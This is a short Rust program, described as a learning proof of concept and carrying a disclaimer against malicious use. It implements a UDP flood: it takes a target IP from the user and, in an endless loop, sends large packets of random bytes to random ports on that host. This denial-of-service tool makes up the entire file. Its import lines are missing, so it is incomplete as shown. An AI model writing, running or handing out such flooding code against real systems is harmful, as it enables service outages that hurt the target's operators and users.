// This is a PoC I wrote while learning Rust and it's not to be used for malicious purposes
fn main() {
    // Prompt the user to enter an IP address to send UDP packets to
    println!("Enter the IP address to send UDP packets to: ");
    let mut ip_addr = String::new();
    std::io::stdin()
        .read_line(&mut ip_addr)
        .expect("Failed to read input");
    let mut rng = thread_rng();
    loop {
        // Parse the IP address from the user input
        let ip_addr = ip_addr.trim();

        // Create a UDP socket
        let socket = UdpSocket::bind("0.0.0.0:0").expect("Failed to create socket");

        // Create a buffer with random data to use as the UDP packet payload
        let packet_size = rng.gen_range(1500..65507); // maximum size of UDP packet payload
        let port = rng.gen_range(1..65535);

        let mut buf = vec![0; packet_size];
        rng.fill(&mut buf[..]);

        // Send the UDP packet to the user-specified IP address and random port
        socket
            .send_to(&buf, (ip_addr, port))
            .expect("Failed to send UDP packet");

        // Print a message indicating that the UDP packet was sent
        println!(
            "UDP packet of size {} sent to {}:{}",
            packet_size, ip_addr, port
        );
    }
}
